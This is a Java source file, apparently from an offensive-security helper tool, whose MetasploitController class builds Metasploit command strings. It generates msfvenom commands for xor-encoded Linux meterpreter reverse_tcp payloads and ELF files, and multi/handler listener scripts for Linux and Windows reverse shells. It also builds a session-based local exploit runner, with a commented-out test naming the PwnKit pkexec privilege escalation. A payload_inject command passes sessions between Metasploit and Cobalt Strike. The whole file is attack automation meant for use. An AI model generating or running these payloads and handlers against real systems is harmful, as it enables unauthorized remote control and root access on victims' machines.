package com.swordHostDemo.controller;

import com.swordHostDemo.pojo.MenuBean;
import com.swordHostDemo.pojo.menuBeanListener;

/**
 * @date: 2022/12/27 20:24
 * @description:
 */
public class MetasploitController extends MenuBean {

    public static String MsflinuxHexCommand() {
        //linuxhex
        String linuxHex = "msfvenom -p linux/x64/meterpreter/reverse_tcp LHOST="+ menuBeanListener.getLhost()+
                " LPORT="+menuBeanListener.getLport()+" -e x64/xor -b '\\x00' -f hex";
        return linuxHex;
    }
    public static String MsflinuxELFCommand() {
        //linuxhex
        String linuxElf = "msfvenom -p linux/x64/meterpreter/reverse_tcp LHOST="+menuBeanListener.getLhost()+
                " LPORT="+menuBeanListener.getLport()+" -f elf -o "+menuBeanListener.getFileName();
        return linuxElf;
    }
    public static String ListenerLinuxhandler(){
        String lisStringCom = "use exploit/multi/handler\n" +
                "set payload linux/x64/meterpreter/reverse_tcp\n" +
                "set lhost "+menuBeanListener.getLhost()+"\n" +
                "set lport "+menuBeanListener.getLport()+"\n" +
                "exploit";
        return lisStringCom;
    }
    public static String ListenerWindowshandler(){
        String lisStringCom = "use exploit/multi/handler\n" +
                "set payload windows/meterpreter/reverse_http\n" +
                "set lhost "+menuBeanListener.getLhost()+"\n" +
                "set lport "+menuBeanListener.getLport()+"\n" +
                "exploit";
        return lisStringCom;
    }
    public static String RootCommand(String payload,String sessionID){
        String lisStringCom =
                "use "+payload+"\n" +
                "set session "+sessionID+"\n" +
                "set lhost "+menuBeanListener.getLhost()+"\n" +
                "set lport "+menuBeanListener.getLport()+"\n" +
                "exploit";
        return lisStringCom;
    }
    

    public static String CsMsfForeignCommand(){

        String CsMsfForeign = "use exploit/multi/handler\n" +
                "set payload windows/meterpreter/reverse_http\n" +
                "set lhost "+menuBeanListener.getLhost()+"\n" +
                "set lport "+menuBeanListener.getLport()+" \n" +
                "exploit";

        return CsMsfForeign;
    }

    public static String MsfCsForeignCommand(){

        String MsfCsForeign = "use exploit/windows/local/payload_inject\n" +
                "set payload windows/meterpreter/reverse_http\n" +
                "set DisablePayloadHandler true\n" +
                "set lhost "+menuBeanListener.getLhost()+"\n" +
                "set lport "+menuBeanListener.getLport()+" \n" +
                "set session 122 \n" +
                "exploit";

        return MsfCsForeign;
    }





//    public static void main(String[] args) {
//        System.out.println(ListenerLinuxhandler("123", "123"));
//        System.out.println(ListenerWindowshandler("123", "123"));
//        System.out.println(RootCommand("exploit/linux/local/cve_2021_4034_pwnkit_lpe_pkexec","1234","1234","2"));
//    }



}
